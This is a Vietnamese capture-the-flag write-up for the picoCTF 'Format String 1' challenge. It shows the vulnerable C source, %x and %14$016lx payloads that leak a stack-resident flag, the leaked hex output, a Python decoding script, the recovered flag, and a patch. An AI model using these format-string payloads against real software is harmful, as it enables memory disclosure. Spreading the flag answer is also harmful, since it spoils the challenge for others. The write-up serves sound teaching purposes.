# Format String 1 Writeup

## 1. Thông tin bài

Bài cho một chương trình C đọc các nội dung bí mật từ file, trong đó có `flag.txt`, rồi nhận input từ người dùng và in lại input đó.

Source code chính:

```c
#include <stdio.h>

int main() {
  char buf[1024];
  char secret1[64];
  char flag[64];
  char secret2[64];

  FILE *fd = fopen("secret-menu-item-1.txt", "r");
  if (fd == NULL){
    printf("'secret-menu-item-1.txt' file not found, aborting.\n");
    return 1;
  }
  fgets(secret1, 64, fd);

  fd = fopen("flag.txt", "r");
  if (fd == NULL){
    printf("'flag.txt' file not found, aborting.\n");
    return 1;
  }
  fgets(flag, 64, fd);

  fd = fopen("secret-menu-item-2.txt", "r");
  if (fd == NULL){
    printf("'secret-menu-item-2.txt' file not found, aborting.\n");
    return 1;
  }
  fgets(secret2, 64, fd);

  printf("Give me your order and I'll read it back to you:\n");
  fflush(stdout);
  scanf("%1024s", buf);
  printf("Here's your order: ");
  printf(buf);
  printf("\n");
  fflush(stdout);

  printf("Bye!\n");
  fflush(stdout);

  return 0;
}
```

## 2. Phân tích lỗi

Lỗi nằm ở đoạn:

```c
printf(buf);
```

Đây là lỗi **format string vulnerability**.

Chương trình đưa trực tiếp input của người dùng vào làm format string cho `printf`. Vì vậy nếu người dùng nhập các format specifier như `%x`, `%p`, `%s`, `%n`, `printf` sẽ xử lý chúng thay vì in nguyên văn.

Cách viết an toàn phải là:

```c
printf("%s", buf);
```

Khi đó `buf` chỉ được xem là chuỗi dữ liệu để in ra, không được xem là format string.

## 3. Ý tưởng khai thác

Các biến local của chương trình nằm trên stack:

```c
char buf[1024];
char secret1[64];
char flag[64];
char secret2[64];
```

Biến `flag` được đọc từ file `flag.txt` bằng `fgets`, nên nội dung flag nằm trong stack khi chương trình gọi:

```c
printf(buf);
```

Do có lỗi format string, ta có thể dùng `%x` hoặc `%lx` để leak dữ liệu trên stack.

- `%x`: leak 4 byte dạng hex.
- `%lx`: leak 8 byte dạng hex trên hệ 64-bit.
- `%p`: leak giá trị dạng địa chỉ.
- `%n`: ghi số byte đã in vào một địa chỉ, nhưng bài này chỉ cần leak nên không cần dùng `%n`.

## 4. Dò stack bằng `%x`

Ban đầu thử leak nhiều giá trị stack:

```text
%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
```

Output mẫu:

```text
Here's your order: 6a147a40.0.0.a.400.a324b4f.0.0.3e599ab0.3de00ec7.3e58f9d7.4.0.a4b4f.3e59a680...
```

Khi test local với nội dung flag tạm là `OK`, ta thấy giá trị:

```text
a4b4f
```

Giá trị này thực chất là:

```text
000a4b4f
```

Tách thành byte:

```text
00 0a 4b 4f
```

Do kiến trúc dùng little endian, khi đọc ngược lại sẽ là:

```text
4f 4b 0a 00
```

Đổi sang ASCII:

```text
4f = O
4b = K
0a = newline
00 = null byte
```

Vậy `a4b4f` chính là nội dung `OK\n\0`.

Điều này chứng minh rằng format string đã leak được nội dung biến `flag` trên stack.

## 5. Dò offset chính xác bằng positional parameter

Thay vì dùng nhiều `%x` liên tiếp, ta dùng dạng positional parameter:

```text
%14$x
```

Nghĩa là in argument thứ 14 dưới dạng hex.

Dò lần lượt các khoảng:

```text
%1$x.%2$x.%3$x.%4$x.%5$x.%6$x.%7$x.%8$x.%9$x.%10$x
```

```text
%11$x.%12$x.%13$x.%14$x.%15$x.%16$x.%17$x.%18$x.%19$x.%20$x
```

Output quan trọng:

```text
Here's your order: b0280dc0.0.0.6f636970.6d316e34.33317937.3431665f.64303935.7.433598d8
```

Ta thấy từ offset 14 bắt đầu có dữ liệu giống ASCII khi decode little endian:

```text
%14$x = 6f636970
```

Tách byte:

```text
6f 63 69 70
```

Đảo little endian:

```text
70 69 63 6f
```

ASCII:

```text
pico
```

Vậy flag bắt đầu leak từ offset 14.

## 6. Dùng `%lx` để leak 8 byte trên 64-bit

Chương trình chạy trên hệ 64-bit, nên dùng `%lx` sẽ leak 8 byte mỗi lần, dễ ghép flag hơn `%x`.

Payload:

```text
%14$016lx.%15$016lx.%16$016lx.%17$016lx.%18$016lx.%19$016lx.%20$016lx.%21$016lx.%22$016lx.%23$016lx.%24$016lx
```

Trong đó:

- `%14$lx`: lấy argument thứ 14 và in dạng hex 64-bit.
- `016`: căn đủ 16 ký tự hex, thiếu thì thêm số `0` ở đầu.
- `%14$016lx`: in argument thứ 14 dạng hex 64-bit đủ 16 ký tự.

Output nhận được:

```text
Here's your order: 7b4654436f636970.355f31346d316e34.3478345f33317937.35365f673431665f.007d313464303935.0000000000000007.00007e779c0708d8.0000002300000007.206e693374307250.00000a336c797453.0000000000000009
```

Các cụm chứa flag là:

```text
7b4654436f636970
355f31346d316e34
3478345f33317937
35365f673431665f
007d313464303935
```

## 7. Decode little endian

Vì dữ liệu trên máy được lưu theo little endian, mỗi cụm 8 byte cần đảo byte lại.

### Cụm 1

```text
7b4654436f636970
```

Tách byte:

```text
7b 46 54 43 6f 63 69 70
```

Đảo lại:

```text
70 69 63 6f 43 54 46 7b
```

ASCII:

```text
picoCTF{
```

### Cụm 2

```text
355f31346d316e34
```

Decode ra:

```text
4n1m41_5
```

### Cụm 3

```text
3478345f33317937
```

Decode ra:

```text
7y13_4x4
```

### Cụm 4

```text
35365f673431665f
```

Decode ra:

```text
_f14g_65
```

### Cụm 5

```text
007d313464303935
```

Decode ra:

```text
590d41}
```

Ghép các phần lại:

```text
picoCTF{4n1m41_57y13_4x4_f14g_65590d41}
```

## 8. Script decode tự động

Có thể dùng Python để decode các cụm hex:

```python
leak = "7b4654436f636970.355f31346d316e34.3478345f33317937.35365f673431665f.007d313464303935"

for part in leak.split("."):
    value = int(part, 16)
    data = value.to_bytes(8, "little")
    print(data.decode(errors="ignore"), end="")

print()
```

Output:

```text
picoCTF{4n1m41_57y13_4x4_f14g_65590d41}
```

## 9. Flag

```text
picoCTF{4n1m41_57y13_4x4_f14g_65590d41}
```

## 10. Cách vá lỗi

Không được truyền trực tiếp input người dùng vào `printf`.

Code lỗi:

```c
printf(buf);
```

Code an toàn:

```c
printf("%s", buf);
```

Ngoài ra, đoạn này cũng nên sửa:

```c
scanf("%1024s", buf);
```

Vì `buf` có kích thước 1024 byte, `%1024s` có thể đọc 1024 ký tự rồi thêm byte kết thúc chuỗi `\0`, dẫn đến cần 1025 byte. Nên sửa thành:

```c
scanf("%1023s", buf);
```

Bản sửa an toàn hơn:

```c
scanf("%1023s", buf);
printf("Here's your order: ");
printf("%s", buf);
printf("\n");
```

## 11. Kết luận

Bài này khai thác lỗi format string để leak dữ liệu trên stack. Do biến `flag` được đọc vào một mảng local trong hàm `main`, nội dung flag nằm trên stack. Bằng cách dùng `%14$016lx`, ta đọc được các cụm 8 byte của flag, sau đó đảo little endian để khôi phục chuỗi ban đầu.

Tóm tắt hướng làm:

```text
printf(buf) bị lỗi format string
-> dùng %x/%lx để leak stack
-> tìm offset bắt đầu chứa flag
-> xác định flag bắt đầu ở offset 14
-> dùng %14$016lx đến %18$016lx để leak 8 byte mỗi lần
-> đảo little endian
-> ghép lại thành flag hoàn chỉnh
```
